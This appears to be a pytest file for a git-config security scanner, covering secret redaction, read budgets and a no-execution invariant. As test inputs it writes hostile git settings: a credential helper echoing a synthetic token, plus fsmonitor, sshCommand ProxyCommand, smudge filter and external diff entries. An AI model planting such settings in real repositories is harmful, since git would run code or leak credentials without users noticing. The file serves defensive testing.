_TOKEN = "ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890"  # noqa: S105 — synthetic


class TestSecretsAreRedacted:
    """Review item 7: a token in a config value never reaches any output."""

    def _repo(self, tmp_path: Path) -> Path:
        _git_dir(
            tmp_path,
            f'[credential]\n\thelper = "!f() {{ echo password={_TOKEN}; }}; f"\n',
        )
        return tmp_path

    def test_finding_fields_are_redacted(self, tmp_path: Path) -> None:
        findings = scan_repository(self._repo(tmp_path))
        assert findings
        dumped = json.dumps([f.model_dump() for f in findings])
        assert _TOKEN not in dumped
        assert "[REDACTED]" in dumped

    @pytest.mark.parametrize("fmt", ["terminal", "json", "sarif"])
    def test_cli_outputs_are_redacted(self, tmp_path: Path, fmt: str) -> None:
        from mcp_audit.cli import app

        repo = self._repo(tmp_path / "proj")
        r = CliRunner().invoke(
            app,
            ["scan", "--project", str(repo), "--format", fmt, "--no-lock"],
        )
        assert r.exit_code in (0, 1), r.output
        assert _TOKEN not in r.output
        assert "credential" in r.output


class TestReadBudgets:
    """Review item 8: no config can exhaust memory or time, or crash a scan."""

    def test_per_file_cap_is_one_mebibyte(self) -> None:
        assert git_exec._MAX_CONFIG_BYTES == 1024 * 1024

    def test_byte_budget_across_includes_is_reported(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(git_exec, "_MAX_TOTAL_CONFIG_BYTES", 400)
        config = _cfg(tmp_path, "[include]\n" + "\tpath = big\n" * 5)
        (config.parent / "big").write_text("# pad\n" * 30)
        kinds = [(h.kind, h.severity) for h in check_git_config(config)]
        assert ("oversize", Severity.MEDIUM) in kinds

    def test_entry_budget_is_reported(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(git_exec, "_MAX_TOTAL_ENTRIES", 10)
        hits = _hits(tmp_path, "[x]\n" + "\ty = 1\n" * 50)
        assert [(h.kind, h.severity) for h in hits] == [("oversize", Severity.MEDIUM)]

    def test_include_budget_is_reported(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(git_exec, "_MAX_INCLUDES", 3)
        config = _cfg(tmp_path, "[include]\n" + "\tpath = a\n" * 10)
        (config.parent / "a").write_text("[x]\n\ty = 1\n")
        kinds = [(h.kind, h.severity) for h in check_git_config(config)]
        assert ("oversize", Severity.MEDIUM) in kinds

    def test_worktree_configs_share_the_budget(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(git_exec, "_MAX_TOTAL_CONFIG_BYTES", 300)
        git_dir = _git_dir(tmp_path, "[extensions]\n\tworktreeConfig = true\n")
        for i in range(5):
            wt = git_dir / "worktrees" / f"w{i}"
            wt.mkdir(parents=True)
            (wt / "config.worktree").write_text("# pad\n" * 20)
        findings = scan_repository(tmp_path)
        assert any(f.title == "Git config too large to inspect fully" for f in findings)

    def test_run_scan_survives_a_crashing_git_check(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from mcp_audit.scanner import run_scan

        def _boom(*_a: object, **_k: object) -> list[Finding]:
            raise MemoryError("simulated")

        monkeypatch.setattr(git_exec, "scan_cwd_repository", _boom)
        monkeypatch.setattr("mcp_audit.discovery._get_client_specs", lambda: [])
        result = run_scan(skip_rug_pull=True)
        assert any("git config check error: MemoryError" in e for e in result.errors)

    def test_project_scan_survives_a_crashing_git_check(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from rich.console import Console

        from mcp_audit.cli.scan import _apply_project_scan

        def _boom(*_a: object, **_k: object) -> list[Finding]:
            raise RecursionError("simulated")

        monkeypatch.setattr(git_exec, "scan_git_surfaces", _boom)
        result = _apply_project_scan(
            ScanResult(), tmp_path, None, None, Console(quiet=True)
        )
        assert any("git config check error: RecursionError" in e for e in result.errors)


class TestReviewNonBlocking:
    def test_editor_with_empty_argument_is_known(self, tmp_path: Path) -> None:
        hits = _hits(tmp_path, "[core]\n\teditor = emacsclient -t -a ''\n")
        assert [(h.severity, h.tool) for h in hits] == [(Severity.INFO, "emacsclient")]

    def test_hooks_inventory_lists_only_githooks_names(self, tmp_path: Path) -> None:
        git_dir = _git_dir(tmp_path)
        _hook(git_dir / "hooks", "pre-commit")
        _hook(git_dir / "hooks", "query-watchman")  # helper, not a hook name
        _hook(git_dir / "hooks", "my-helper.sh")
        [inv] = [f for f in scan_repository(tmp_path) if f.id == "TRUST-007"]
        assert inv.evidence.endswith(": pre-commit")


# ── Invariant: nothing is executed ───────────────────────────────────────────


def test_never_runs_git_or_anything_else(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A hostile repo is scanned with every process-spawning call booby-trapped."""

    def _boom(*_a: object, **_k: object) -> None:
        raise AssertionError("git_exec tried to start a process")

    for name in ("run", "Popen", "call", "check_call", "check_output"):
        monkeypatch.setattr(subprocess, name, _boom)
    for name in ("system", "popen", "execv", "execvp", "spawnv"):
        if hasattr(os, name):
            monkeypatch.setattr(os, name, _boom)

    git_dir = _git_dir(
        tmp_path,
        "[core]\n\tfsmonitor = ./x\n\tsshCommand = ssh -o ProxyCommand=x\n"
        '[filter "a"]\n\tsmudge = ./s\n[include]\n\tpath = ../.gitconfig\n',
    )
    (tmp_path / ".gitconfig").write_text("[diff]\n\texternal = ./d\n")
    _hook(git_dir / "hooks", "post-index-change")
    _bare(tmp_path / "nested", "[core]\n\tfsmonitor = ./y\n")

    findings = scan_git_surfaces(
        discover_project_git_surfaces(tmp_path), scan_root=tmp_path
    )
    findings += _REAL_SCAN_CWD(tmp_path)
    assert len(_highs(findings)) >= 6
